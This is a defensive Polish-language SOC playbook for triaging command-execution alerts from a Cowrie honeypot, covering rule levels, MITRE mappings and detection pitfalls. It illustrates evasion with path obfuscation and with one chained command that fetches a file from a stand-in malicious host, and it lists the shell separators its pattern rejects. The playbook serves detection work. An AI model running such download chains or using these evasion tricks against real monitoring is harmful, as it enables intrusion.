# PB-002 — Wykonanie komendy na honeypocie

**Reguły:** 100103 (poziom 10) · MITRE T1059 Command and Scripting Interpreter
**Reguła potomna:** 100108 (poziom 3) · MITRE T1082 System Information Discovery
**Źródło:** Cowrie, `cowrie.command.input`

## Co widzę
Ktoś wykonał polecenie w emulowanej powłoce. To pierwszy moment, w którym
napastnik ujawnia zamiar, a nie tylko posiadanie poświadczeń — dlatego komendy
znaczą więcej niż logowania.

Podział na dwa poziomy jest celowy. Czyste rozpoznanie (`uname`, `lscpu`,
`whoami`, `uptime`, `df`) schodzi regułą 100108 na poziom 3, bo jest stanem
normalnym czujnika wystawionego do internetu — w 11 dniach samo
`uname -s -v -n -r -m` padło 37 579 razy. Wszystko pozostałe zostaje na
poziomie 10.

## Jak potwierdzam
1. Czytam pełną treść `data.input`. Nie skracam — obfuskacja siedzi
   w szczegółach.
2. Sprawdzam pozostałe komendy z tej samej sesji (`data.session`). Pojedyncza
   komenda mówi mało, sekwencja mówi o celu.
3. Sprawdzam, czy sesja zakończyła się zapisem pliku (100104 i potomne).
   Rozpoznanie zakończone persystencją to zupełnie inna sprawa niż samo
   rozpoznanie.
4. Odrzucam własny ruch: grupa `canary`, znacznik `soc-canary`.

## Co eskaluję
Poziom 3 (100108) — nie eskaluję pojedynczo, zliczam. Eskaluję zmianę wzorca:
nowe komendy rozpoznawcze, nowa kolejność, nowe źródło powtarzające znany
zestaw.

Poziom 10 (100103) — każde polecenie, które zmienia stan systemu: zapis,
pobranie, modyfikacja kont, instalacja, zmiana konfiguracji. W środowisku
produkcyjnym to zdarzenie wymagałoby natychmiastowej reakcji.

## Jak zamykam
Sekwencję komend z sesji zapisuję w ustaleniu, jeśli różni się od znanych.
Same powtórzenia znanego rozpoznania zamykam jako "rozpoznanie, brak
działania", bez osobnego wpisu.

## Znane fałszywe alarmy
Własne testy — odfiltrowane grupą `canary`.

## Pułapki, na które trzeba uważać

**Obfuskacja ścieżki.** Zaobserwowano `/bin/./uname` zamiast `uname` — ten sam
plik wykonywalny, inny ciąg znaków. Reguła dopasowująca dosłowne `^uname` lub
`/bin/uname` przepuściłaby to bez śladu. Detekcja musi opisywać zachowanie,
nie zapis.

**Doklejanie rozpoznania do polecenia właściwego.** Gdyby reguła 100108
dopasowywała samą nazwę komendy, napastnik obniżyłby sobie poziom alertu,
pisząc `uname -a; wget http://zly.adres/x`. Dlatego wzorzec dopuszcza po
nazwie komendy wyłącznie spacje, litery, cyfry, kropkę, ukośnik i myślnik —
pierwszy średnik, potok, `&&` czy `$(` przerywa dopasowanie i zdarzenie
zostaje na poziomie 10.

**Reguła potomna obniża poziom, nie ukrywa zdarzenia.** Alert nadal powstaje
i nadal jest w indeksie. Wyciszenie do zera odebrałoby możliwość zauważenia,
że rozpoznanie zmieniło charakter.
